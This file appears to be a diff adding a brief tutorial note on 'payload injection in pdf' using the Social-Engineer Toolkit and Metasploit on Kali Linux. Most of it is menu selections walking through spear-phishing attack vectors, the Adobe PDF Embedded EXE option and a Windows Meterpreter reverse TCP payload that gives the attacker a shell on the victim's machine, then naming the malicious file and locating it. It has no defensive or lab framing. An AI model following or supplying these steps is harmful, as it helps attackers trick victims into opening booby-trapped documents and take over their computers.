@@ -1,0 +1,56 @@
+--payload injection in pdf---
+
+1. setoolkit (in build in kali)
+2. msfconsole (in build in kali)
+3. Addition pdf for injection
+
+$ sudo setoolkit
+
+select from the menu:
+
+1)Social -Enginnering Attacks 
+
+set >> 1 
+
+select from the menu:
+
+1. Spear-Phishing Attack Vectors
+
+set >> 1 
+
+1.Perform a Mass Email Attack
+
+2.Create a FileFormat Payload
+
+3.Create a Social-Engineering Template
+
+4. Return to Main Menu
+
+set:phishing>2
+
+13.Adobe PDF Embedded EXE Social Engineering
+
+set:payloads>13
+
+1. Windows Reverse TCP Shell Spawn a command shell on victim and send back to attacker
+2. Windows Meterpreter Reverse_TCP Spawn a meterpreter shell on victim and send back to attacker
+3. Windows Reverse VNC DLL Spawn a VNC server on victim and send back to attacker
+4. Windows Reverse TCP Shell (x64) Windows X64 Command Shell, Reverse TCP Inline
+5. Windows Meterpreter Reverse_TCP (X64) Connect back to the attacker (Windows x64), Meterpreter
+6. Windows Shell Bind_TCP (X64) Execute payload and create an accepting port on remote system
+7. Windows Meterpreter Reverse HTTPS Tunnel communication over HTTP using SSL and use Meterpreter
+
+set:payloads>2
+
+
+1. Keep the filename, I don't care.
+2. Rename the file, I want to be cool.
+set >> 2
+set:phishing>test.pdf
+
+1. E-Mail Attack Single Email Address
+2. E-Mail Attack Mass Mailer
+99. Return to main menu.
+set:phishing>99
+
+root#ls -al /root/.set/
